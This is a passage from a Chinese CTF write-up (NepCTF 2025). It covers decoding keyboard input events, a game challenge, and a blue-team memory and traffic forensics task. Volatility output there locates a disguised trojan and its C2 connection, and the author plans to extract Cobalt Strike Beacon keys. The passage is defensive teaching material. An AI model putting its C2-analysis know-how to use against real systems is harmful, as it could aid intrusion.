&quot;KEY_BRIGHTNESSUP&quot;,</span><br><span class="line">        226: &quot;KEY_MEDIA&quot;,</span><br><span class="line"></span><br><span class="line">        227: &quot;KEY_SWITCHVIDEOMODE&quot;,</span><br><span class="line">        228: &quot;KEY_KBDILLUMTOGGLE&quot;,</span><br><span class="line">        229: &quot;KEY_KBDILLUMDOWN&quot;,</span><br><span class="line">        230: &quot;KEY_KBDILLUMUP&quot;,</span><br><span class="line"></span><br><span class="line">        231: &quot;KEY_SEND&quot;,</span><br><span class="line">        232: &quot;KEY_REPLY&quot;,</span><br><span class="line">        233: &quot;KEY_FORWARDMAIL&quot;,</span><br><span class="line">        234: &quot;KEY_SAVE&quot;,</span><br><span class="line">        235: &quot;KEY_DOCUMENTS&quot;,</span><br><span class="line"></span><br><span class="line">        236: &quot;KEY_BATTERY&quot;,</span><br><span class="line"></span><br><span class="line">        237: &quot;KEY_BLUETOOTH&quot;,</span><br><span class="line">        238: &quot;KEY_WLAN&quot;,</span><br><span class="line">        239: &quot;KEY_UWB&quot;,</span><br><span class="line"></span><br><span class="line">        240: &quot;KEY_UNKNOWN&quot;,</span><br><span class="line"></span><br><span class="line">        241: &quot;KEY_VIDEO_NEXT&quot;,</span><br><span class="line">        242: &quot;KEY_VIDEO_PREV&quot;,</span><br><span class="line">        243: &quot;KEY_BRIGHTNESS_CYCLE&quot;,</span><br><span class="line">        244: &quot;KEY_BRIGHTNESS_AUTO&quot;,</span><br><span class="line">        244: &quot;KEY_BRIGHTNESS_ZERO&quot;,</span><br><span class="line">        245: &quot;KEY_DISPLAY_OFF&quot;,</span><br><span class="line"></span><br><span class="line">        246: &quot;KEY_WWAN&quot;,</span><br><span class="line">        246: &quot;KEY_WIMAX&quot;,</span><br><span class="line">        247: &quot;KEY_RFKILL&quot;,</span><br><span class="line"></span><br><span class="line">        248: &quot;KEY_MICMUTE&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shift = False</span><br><span class="line">while event:</span><br><span class="line">    (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)</span><br><span class="line"></span><br><span class="line">    if type != 0or code != 0or value != 0:</span><br><span class="line">        # print(f&#x27;&#123;tv_sec&#125;.&#123;tv_usec&#125;, &#123;type&#125;, &#123;code&#125;, &#123;value&#125;, &#123;value:08b&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">        if type == 0x01: # EV_KEY</span><br><span class="line">            key = keymap[code]</span><br><span class="line">            if value == 1:</span><br><span class="line">                key_label = key[4:]</span><br><span class="line">                if len(key_label) == 1:</span><br><span class="line">                    if shift:</span><br><span class="line">                        sys.stdout.write(key_label.upper())</span><br><span class="line">                    else:</span><br><span class="line">                        sys.stdout.write(key_label.lower())</span><br><span class="line">                elif&quot;SHIFT&quot;in key:</span><br><span class="line">                    shift = True</span><br><span class="line">                elif key_label == &quot;LEFTBRACE&quot;:</span><br><span class="line">                    sys.stdout.write(&quot;&#123;&quot;)</span><br><span class="line">                elif key_label == &quot;RIGHTBRACE&quot;:</span><br><span class="line">                    sys.stdout.write(&quot;&#125;&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    print(key_label)</span><br><span class="line">            else:</span><br><span class="line">                if&quot;SHIFT&quot;in key:</span><br><span class="line">                    shift = False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    event = in_file.read(EVENT_SIZE)</span><br><span class="line"></span><br><span class="line">in_file.close()</span><br></pre></td></tr></table></figure></div>

<p>最终可以得到<code>NepCTF&#123;NepCTF-20250725-114514&#125;</code></p>
<h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a><strong>SpeedMino</strong></h2><p>手打通关,当然也可以逆向，改源码，改速度等等</p>
<p>CE也可以，但是不能直接改分数，做了点微小的校验，具体看lua代码</p>
<p>当然也有卡方块不锁定的机制挂机3小时</p>
<h2 id="客服小美"><a href="#客服小美" class="headerlink" title="客服小美"></a><strong>客服小美</strong></h2><p>本题目取材于实网演练，主要是为了提升大家蓝队流量分析的能力，拒绝套娃脑洞，希望大家玩的开心。</p>
<p>题目有两个附件，pcap流量包和raw内存镜像，先使用Volatility分析内存镜像。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol2 -f DESKTOP.raw imageinfo</span><br></pre></td></tr></table></figure></div>

<p>系统用户名可以检索桌面文件夹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vol2 -f DESKTOP.raw --profile=Win10x64_19041 filescan|grep Desktop</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x0000d804abd02720      2      0 R--r-d \Device\HarddiskVolume3\Windows\System32\DispBroker.Desktop.dll</span><br><span class="line">0x0000d804abd6dd30  32768      1 R--rw- \Device\HarddiskVolume3\Users\JohnDoe\Desktop</span><br><span class="line">0x0000d804ac697ab0     11      0 R--r-d \Device\HarddiskVolume3\Windows\System32\SettingsEnvironment.Desktop.dll</span><br><span class="line">0x0000d804ac8b1660  31802      1 RW-rw- \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DESKTOP-OKEP6GL-20250113-073001.raw</span><br><span class="line">0x0000d804acf0ae80     15      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DumpIt.exe</span><br><span class="line">0x0000d804ad57f710      1      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\DumpIt.exe</span><br><span class="line">0x0000d804ad5806b0      5      0 R--r-d \Device\HarddiskVolume3\Windows\System32\WindowsInternal.ComposableShell.DesktopHosting.dll</span><br><span class="line">0x0000d804ad581b00      4      0 R--r-d \Device\HarddiskVolume3\Users\JohnDoe\Desktop\关于2025年部分节假日安排的通知.exe</span><br></pre></td></tr></table></figure></div>

<p>可以看到用户名为<code>JohnDoe</code></p>
<p>还需要分析木马的外联地址，可以查看网络连接情况。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">vol3 -f DESKTOP.raw windows.netscan</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.11.0</span><br><span class="line">Progress:  100.00                PDB scanning finished</span><br><span class="line">Offset        Proto        LocalAddr        LocalPort        ForeignAddr        ForeignPort        State        PID        Owner        Created</span><br><span class="line"></span><br><span class="line">0xd804a74c21b0        TCPv4        192.168.27.169        139        0.0.0.0        0        LISTENING        4        System        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804a74c25d0        TCPv4        0.0.0.0        7680        0.0.0.0        0        LISTENING        6344        svchost.exe        2025-01-13 07:29:56.000000 UTC</span><br><span class="line">0xd804a74c25d0        TCPv6        ::        7680        ::        0        LISTENING        6344        svchost.exe        2025-01-13 07:29:56.000000 UTC</span><br><span class="line">0xd804a75a4010        TCPv4        192.168.27.169        49676        95.101.213.180        80        ESTABLISHED        3392        svchost.exe        2025-01-13 07:28:20.000000 UTC</span><br><span class="line">0xd804a83e8730        TCPv4        0.0.0.0        49664        0.0.0.0        0        LISTENING        652        lsass.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e8730        TCPv6        ::        49664        ::        0        LISTENING        652        lsass.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e89f0        TCPv4        0.0.0.0        135        0.0.0.0        0        LISTENING        876        svchost.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e89f0        TCPv6        ::        135        ::        0        LISTENING        876        svchost.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e8b50        TCPv4        0.0.0.0        49665        0.0.0.0        0        LISTENING        500        wininit.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e8cb0        TCPv4        0.0.0.0        49666        0.0.0.0        0        LISTENING        512        svchost.exe        2025-01-13 07:27:55.000000 UTC</span><br><span class="line">0xd804a83e9910        TCPv4        0.0.0.0        49664        0.0.0.0        0        LISTENING        652        lsass.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e9a70        TCPv4        0.0.0.0        135        0.0.0.0        0        LISTENING        876        svchost.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e9bd0        TCPv4        0.0.0.0        49665        0.0.0.0        0        LISTENING        500        wininit.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e9bd0        TCPv6        ::        49665        ::        0        LISTENING        500        wininit.exe        2025-01-13 07:27:54.000000 UTC</span><br><span class="line">0xd804a83e9d30        TCPv4        0.0.0.0        49666        0.0.0.0        0        LISTENING        512        svchost.exe        2025-01-13 07:27:55.000000 UTC</span><br><span class="line">0xd804a83e9d30        TCPv6        ::        49666        ::        0        LISTENING        512        svchost.exe        2025-01-13 07:27:55.000000 UTC</span><br><span class="line">0xd804a8654270        TCPv4        192.168.27.169        49718        192.168.27.132        12580        CLOSED        6492        s�2025t��G剒        2025-01-13 07:29:55.000000 UTC</span><br><span class="line">0xd804abd4d890        TCPv4        0.0.0.0        445        0.0.0.0        0        LISTENING        4        System        2025-01-13 07:28:03.000000 UTC</span><br><span class="line">0xd804abd4d890        TCPv6        ::        445        ::        0        LISTENING        4        System        2025-01-13 07:28:03.000000 UTC</span><br><span class="line">0xd804abd4db50        TCPv4        0.0.0.0        5357        0.0.0.0        0        LISTENING        4        System        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804abd4db50        TCPv6        ::        5357        ::        0        LISTENING        4        System        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804abd4dcb0        TCPv4        0.0.0.0        49668        0.0.0.0        0        LISTENING        1776        spoolsv.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abd4dcb0        TCPv6        ::        49668        ::        0        LISTENING        1776        spoolsv.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abd4de10        TCPv4        0.0.0.0        49669        0.0.0.0        0        LISTENING        636        services.exe        2025-01-13 07:28:01.000000 UTC</span><br><span class="line">0xd804abd4de10        TCPv6        ::        49669        ::        0        LISTENING        636        services.exe        2025-01-13 07:28:01.000000 UTC</span><br><span class="line">0xd804abd4e230        TCPv4        0.0.0.0        49667        0.0.0.0        0        LISTENING        276        svchost.exe        2025-01-13 07:27:57.000000 UTC</span><br><span class="line">0xd804abd4e230        TCPv6        ::        49667        ::        0        LISTENING        276        svchost.exe        2025-01-13 07:27:57.000000 UTC</span><br><span class="line">0xd804abd4e390        TCPv4        0.0.0.0        49668        0.0.0.0        0        LISTENING        1776        spoolsv.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abd4e650        TCPv4        0.0.0.0        49667        0.0.0.0        0        LISTENING        276        svchost.exe        2025-01-13 07:27:57.000000 UTC</span><br><span class="line">0xd804abd4e7b0        TCPv4        0.0.0.0        49669        0.0.0.0        0        LISTENING        636        services.exe        2025-01-13 07:28:01.000000 UTC</span><br><span class="line">0xd804abf3c220        UDPv4        0.0.0.0        5355        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3c220        UDPv6        ::        5355        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3c540        UDPv4        0.0.0.0        5353        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3d800        UDPv4        0.0.0.0        5355        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3dcb0        UDPv4        0.0.0.0        0        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3dcb0        UDPv6        ::        0        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3de40        UDPv4        192.168.27.169        137        *        0                4        System        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3e160        UDPv4        192.168.27.169        138        *        0                4        System        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3e930        UDPv4        0.0.0.0        5353        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804abf3e930        UDPv6        ::        5353        *        0                1220        svchost.exe        2025-01-13 07:27:58.000000 UTC</span><br><span class="line">0xd804ac0cd220        UDPv4        0.0.0.0        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0cd220        UDPv6        ::        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0ce030        UDPv4        0.0.0.0        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0ce030        UDPv6        ::        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0ce1c0        UDPv4        0.0.0.0        59165        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0ceb20        UDPv4        0.0.0.0        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0cee40        UDPv4        0.0.0.0        59166        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0cee40        UDPv6        ::        59166        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac0cfde0        UDPv4        0.0.0.0        3702        *        0                2020        svchost.exe        2025-01-13 07:28:00.000000 UTC</span><br><span class="line">0xd804ac2a48f0        UDPv4        127.0.0.1        59167        *        0                276        svchost.exe        2025-01-13 07:28:02.000000 UTC</span><br><span class="line">0xd804ac390040        UDPv4        0.0.0.0        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac3a06c0        UDPv4        0.0.0.0        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac6852f0        UDPv4        127.0.0.1        56743        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac685480        UDPv6        fe80::4d58:f204:161a:3832        1900        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac685ac0        UDPv6        ::1        56741        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac686100        UDPv4        192.168.27.169        56742        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac686290        UDPv6        ::1        1900        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac686420        UDPv4        192.168.27.169        1900        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac6870a0        UDPv4        127.0.0.1        1900        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac687550        UDPv6        fe80::4d58:f204:161a:3832        56740        *        0                2020        svchost.exe        2025-01-13 07:28:10.000000 UTC</span><br><span class="line">0xd804ac6876e0        UDPv4        0.0.0.0        65040        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac6876e0        UDPv6        ::        65040        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac687b90        UDPv4        0.0.0.0        65039        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac6889a0        UDPv4        0.0.0.0        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac6889a0        UDPv6        ::        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac68a110        UDPv4        0.0.0.0        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac68a110        UDPv6        ::        3702        *        0                2576        dasHost.exe        2025-01-13 07:28:11.000000 UTC</span><br><span class="line">0xd804ac6c0890        TCPv4        0.0.0.0        5040        0.0.0.0        0        LISTENING        1092        svchost.exe        2025-01-13 07:28:21.000000 UTC</span><br><span class="line">0xd804ac73d930        TCPv4        192.168.27.169        49696        13.107.246.74        443        CLOSE_WAIT        5456        OneDrive.exe        2025-01-13 07:29:03.000000 UTC</span><br><span class="line">0xd804ac73e4a0        TCPv4        192.168.27.169        49681        95.101.219.62        443        ESTABLISHED        3944        explorer.exe        2025-01-13 07:28:30.000000 UTC</span><br><span class="line">0xd804ac740930        TCPv4        192.168.27.169        49689        40.126.35.21        443        ESTABLISHED        276        svchost.exe        2025-01-13 07:28:50.000000 UTC</span><br><span class="line">0xd804ac8ae710        UDPv4        0.0.0.0        5050        *        0                1092        svchost.exe        2025-01-13 07:28:17.000000 UTC</span><br><span class="line">0xd804acd966e0        TCPv4        192.168.27.169        49686        140.249.58.3        443        ESTABLISHED        5048        SearchApp.exe        2025-01-13 07:28:42.000000 UTC</span><br><span class="line">0xd804acd97010        TCPv4        192.168.27.169        49687        202.89.233.101        443        ESTABLISHED        5048        SearchApp.exe        2025-01-13 07:28:42.000000 UTC</span><br><span class="line">0xd804acd97930        TCPv4        192.168.27.169        49680        202.89.233.96        443        CLOSED        3944        explorer.exe        2025-01-13 07:28:30.000000 UTC</span><br><span class="line">0xd804acd99010        TCPv4        192.168.27.169        49679        20.247.160.101        443        ESTABLISHED        2300        MsMpEng.exe        2025-01-13 07:28:28.000000 UTC</span><br><span class="line">0xd804acd994a0        TCPv4        192.168.27.169        49678        23.196.36.248        443        ESTABLISHED        3392        svchost.exe        2025-01-13 07:28:22.000000 UTC</span><br><span class="line">0xd804ace96a20        TCPv4        192.168.27.169        49695        13.107.246.74        443        CLOSE_WAIT        5456        OneDrive.exe        2025-01-13 07:29:03.000000 UTC</span><br><span class="line">0xd804ace97a20        TCPv4        192.168.27.169        49691        4.144.165.14        443        ESTABLISHED        2280        smartscreen.ex        2025-01-13 07:28:52.000000 UTC</span><br><span class="line">0xd804ad24ab00        TCPv4        192.168.27.169        49717        104.208.16.90        443        CLOSED        2100        svchost.exe        2025-01-13 07:29:53.000000 UTC</span><br><span class="line">0xd804ad2edb40        TCPv4        192.168.27.169        49697        20.190.144.139        443        ESTABLISHED        276        svchost.exe        2025-01-13 07:29:06.000000 UTC</span><br><span class="line">0xd804ad364460        TCPv4        192.168.27.169        49692        20.190.163.20        443        ESTABLISHED        5456        OneDrive.exe        2025-01-13 07:28:55.000000 UTC</span><br></pre></td></tr></table></figure></div>

<p>发现<code>关于2025年部分节假日安排的通知.exe</code>的外联地址是<code>192.168.27.132</code>，端口为<code>12580</code></p>
<p>接下来分析pcap流量包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgrvnOMDR2kt6aDBBnNVAtOPnOGWeFclprWqkjsnv27XicWMCQsK9jyaA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>发现很明显的CobalStrike流量特征，直接找通信数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgZCNGicsegnxCiavBPoRg3oxMzTLzUeicibRoF367spjZbCSkhbbnapTkMQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgCJ3SxzlK02o8hmNHH60kXvZTxbXZgCo0tK4iaic1iaxOibkoVSfkXsicwbw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>现在需要一个AES Key和HMAC Key来解密通信数据，国内关于CobalStrike流量分析的题目都会给<code>.cobaltstrike.beacon_keys</code>文件，但是这道题是没有的，防止大家解题思维固化。这里就需要一些tricks，从内存镜像中提取Beacon进程的数据以后再解析AES Key和HMAC Key。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">vol2 -f DESKTOP.raw --profile=Win10x64_19041 pslist</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit</span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0xffffd804a749a080 System                    4      0    133        0 ------      0 2025-01-13 07:27:49 UTC+0000</span><br><span class="line">0xffffd804a751f080 Registry                 92      4      4        0 ------      0 2025-01-13 07:27:33 UTC+0000</span><br><span class="line">0xffffd804a86ae280 smss.exe                344      4      2        0 ------      0 2025-01-13 07:27:49 UTC+0000</span><br><span class="line">0xffffd804a8c3c140 csrss.exe               424    416     10        0      0      0 2025-01-13 07:27:51 UTC+0000</span><br><span class="line">0xffffd804a8f81140 wininit.exe             500    416      1        0      0      0 2025-01-13 07:27:51 UTC+0000</span><br><span class="line">0xffffd804a8f82080 csrss.exe               508    492     11        0      1      0 2025-01-13 07:27:51 UTC+0000</span><br><span class="line">0xffffd804a8e75240 winlogon.exe            568    492      6        0      1      0 2025-01-13 07:27:51 UTC+0000</span><br><span class="line">0xffffd804a8fd4080 services.exe            636    500      7        0      0      0 2025-01-13 07:27:52 UTC+0000</span><br><span class="line">0xffffd804a8fe60c0 lsass.exe               652    500      9        0      0      0 2025-01-13 07:27:52 UTC+0000</span><br><span class="line">0xffffd804a8763240 svchost.exe             760    636     23        0      0      0 2025-01-13 07:27:53 UTC+0000</span><br><span class="line">0xffffd804a8770140 fontdrvhost.ex          768    568      5        0      1      0 2025-01-13 07:27:53 UTC+0000</span><br><span class="line">0xffffd804a876e140 fontdrvhost.ex          772    500      5        0      0      0 2025-01-13 07:27:53 UTC+0000</span><br><span class="line">0xffffd804a87c72c0 svchost.exe             876    636      9        0      0      0 2025-01-13 07:27:53 UTC+0000</span><br><span class="line">0xffffd804abc0e080 dwm.exe                 956    568     20        0      1      0 2025-01-13 07:27:54 UTC+0000</span><br><span class="line">0xffffd804abc72240 svchost.exe             276    636    100        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abc8e2c0 svchost.exe             448    636     20        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abc97300 svchost.exe             512    636     19        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abca8280 svchost.exe             696    636     22        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abcd52c0 svchost.exe            1052    636      4        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abd1a2c0 svchost.exe            1092    636     29        0      0      0 2025-01-13 07:27:55 UTC+0000</span><br><span class="line">0xffffd804abd5d280 svchost.exe            1184    636      5        0      0      0 2025-01-13 07:27:56 UTC+0000</span><br><span class="line">0xffffd804abd612c0 svchost.exe            1220    636     24        0      0      0 2025-01-13 07:27:56 UTC+0000</span><br><span class="line">0xffffd804a75b5040 MemCompression         1372      4     22        0 ------      0 2025-01-13 07:27:56 UTC+0000</span><br><span class="line">0xffffd804abdf7300 svchost.exe            1476    636     12        0      0      0 2025-01-13 07:27:57 UTC+0000</span><br><span class="line">0xffffd804abe65300 svchost.exe            1572    636      5        0      0      0 2025-01-13 07:27:57 UTC+0000</span><br><span class="line">0xffffd804abe68080 svchost.exe            1584    636     16        0      0      0 2025-01-13 07:27:57 UTC+0000</span><br><span class="line">0xffffd804abe88240 svchost.exe            1656    636     10        0      0      0 2025-01-13 07:27:58 UTC+0000</span><br><span class="line">0xffffd804abee9240 spoolsv.exe            1776    636     13        0      0      0 2025-01-13 07:27:58 UTC+0000</span><br><span class="line">0xffffd804abeeb300 svchost.exe            1900    636     19        0      0      0 2025-01-13 07:27:59 UTC+0000</span><br><span class="line">0xffffd804abfda300 svchost.exe            2020    636     20        0      0      0 2025-01-13 07:27:59 UTC+0000</span><br><span class="line">0xffffd804ac0ec240 svchost.exe            2100    636     16        0      0      0 2025-01-13 07:28:00 UTC+0000</span><br><span class="line">0xffffd804ac1c8300 VGAuthService.         2216    636      3        0      0      0 2025-01-13 07:28:01 UTC+0000</span><br><span class="line">0xffffd804ac1c9080 vm3dservice.ex         2244    636      7        0      0      0 2025-01-13 07:28:01 UTC+0000</span><br><span class="line">0xffffd804ac1ca080 vmtoolsd.exe           2260    636     12        0      0      0 2025-01-13 07:28:01 UTC+0000</span><br><span class="line">0xffffd804ac204280 MsMpEng.exe            2300    636     32        0      0      0 2025-01-13 07:28:01 UTC+0000</span><br><span class="line">0xffffd804ac22c280 vm3dservice.ex         2432   2244      8        0      1      0 2025-01-13 07:28:01 UTC+0000</span><br><span class="line">0xffffd804a8c6e280 dllhost.exe            2672    636     21        0      0      0 2025-01-13 07:28:03 UTC+0000</span><br><span class="line">0xffffd804ac409280 dllhost.exe            2812    636     17        0      0      0 2025-01-13 